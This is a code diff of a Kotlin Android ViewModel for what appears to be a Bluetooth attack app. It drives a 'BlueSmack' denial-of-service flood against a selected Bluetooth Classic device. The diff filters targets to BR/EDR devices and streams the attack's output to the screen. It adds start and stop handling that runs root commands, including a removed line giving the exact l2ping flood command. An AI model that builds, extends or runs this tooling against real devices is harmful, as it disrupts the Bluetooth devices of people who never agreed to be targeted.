@@ -6,18 +6,24 @@ import android.bluetooth.BluetoothManager
 import androidx.lifecycle.AndroidViewModel
 import androidx.lifecycle.viewModelScope
 import com.hereliesaz.blusnu.data.ActionLogger
+import com.hereliesaz.blusnu.data.BlueSmackModule
 import com.hereliesaz.blusnu.data.DeviceRepository
+import com.hereliesaz.blusnu.data.Protocol
 import com.hereliesaz.blusnu.data.TargetDevice
-import com.hereliesaz.blusnu.utils.MacValidator
 import com.hereliesaz.blusnu.utils.RootExecutor
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.flow.asStateFlow
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 
-class BlueSmackViewModel(application: Application, deviceRepository: DeviceRepository) : AndroidViewModel(application) {
+class BlueSmackViewModel(
+    application: Application,
+    deviceRepository: DeviceRepository,
+    private val blueSmackModule: BlueSmackModule
+) : AndroidViewModel(application) {
 
     private val _selectedDevice = MutableStateFlow<TargetDevice?>(null)
     val selectedDevice: StateFlow<TargetDevice?> = _selectedDevice
@@ -30,10 +36,15 @@ class BlueSmackViewModel(application: Application, deviceRepository: DeviceRepos
 
     private val bluetoothAdapter: BluetoothAdapter? = (application.getSystemService(BluetoothManager::class.java) as BluetoothManager).adapter
 
+    private var attackJob: Job? = null
+
     init {
         viewModelScope.launch {
-            deviceRepository.allDevices.collect {
-                _devices.value = it
+            deviceRepository.allDevices.collect { allDevices ->
+                // BlueSmack targets BR/EDR (Classic) via L2CAP. Filter out BLE-only devices.
+                _devices.value = allDevices.filter {
+                    it.protocol == Protocol.CLASSIC || it.protocol == Protocol.DUAL
+                }
             }
         }
     }
@@ -57,12 +68,32 @@ class BlueSmackViewModel(application: Application, deviceRepository: DeviceRepos
             return
         }
 
-        viewModelScope.launch {
+        attackJob = viewModelScope.launch {
             _status.value = "Running l2ping flood against ${device.address}... (requires root)"
-            MacValidator.requireValid(device.address)
-            val command = "l2ping -i hci0 -s 600 -f ${device.address}"
-            val result = RootExecutor.execute(command)
-            _status.value = if (result.isBlank()) "Attack finished." else result.take(200)
+            try {
+                blueSmackModule.startAttack(device.address).collect { line ->
+                    _status.value = line
+                }
+            } catch (e: Exception) {
+                _status.value = "Error: ${e.message}"
+            }
+            _status.value = "Attack finished."
         }
+    }
+
+    fun stopAttack() {
+        attackJob?.cancel()
+        attackJob = null
+        viewModelScope.launch {
+            withContext(Dispatchers.IO) {
+                RootExecutor.execute("killall l2ping")
+            }
+            _status.value = "Attack stopped."
+        }
+    }
+
+    override fun onCleared() {
+        super.onCleared()
+        attackJob?.cancel()
     }
 }
